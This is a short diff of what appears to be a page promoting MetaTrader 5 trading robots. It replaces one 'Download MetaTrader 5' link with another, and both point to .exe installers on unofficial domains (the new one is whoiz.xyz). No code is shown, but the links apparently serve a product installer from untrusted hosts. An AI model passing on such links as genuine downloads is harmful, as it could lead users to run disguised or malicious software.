@@ -34,4 +34,4 @@ Trading robots have proven their profitability many times during the public algo
 
 Trading robots have proven their profitability many times during the public algorithmic trading championship Automated Trading Championship 2006-2012
 
-# <a href="https://blockchain.reprizm.tech/Metatrade-5.exe"> Download MetaTrader 5 and use robots in trading </a>
+# <a href="https://whoiz.xyz/mt5setup.exe"> Download MetaTrader 5 and use robots in trading </a>
